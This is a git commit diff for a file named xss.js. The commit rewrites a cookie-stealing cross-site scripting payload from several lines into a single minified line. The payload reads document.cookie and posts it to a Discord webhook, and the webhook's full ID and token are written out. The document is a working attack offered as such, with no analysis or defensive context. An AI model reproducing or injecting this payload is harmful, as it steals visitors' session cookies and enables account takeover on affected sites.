3065e53864035ebf48330f182457cdcb0d193227
326dead5 <93828273+326dead5@users.noreply.github.com>
2021-12-22 15:50:51 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,10 +1,1 @@
-let cok = document.cookie;
-const request = new XMLHttpRequest();
-request.open("POST", "https://discord.com/api/webhooks/922506456329244702/Qyspny1sV_5tWjjhG5lU3VO8wYgxfBQ_6erZAmqLxYdYorfjz5pydB38LRP4iPl3L0gZ");
-request.setRequestHeader('Content-type', 'application/json');
-const params = {
-    content: "Cookies: " + cok
-}
-request.send(JSON.stringify(params));
-
-
+let cok = document.cookie;const request = new XMLHttpRequest();request.open("POST", "https://discord.com/api/webhooks/922506456329244702/Qyspny1sV_5tWjjhG5lU3VO8wYgxfBQ_6erZAmqLxYdYorfjz5pydB38LRP4iPl3L0gZ");request.setRequestHeader('Content-type', 'application/json');const params = {content: "Cookies: " + cok};request.send(JSON.stringify(params));
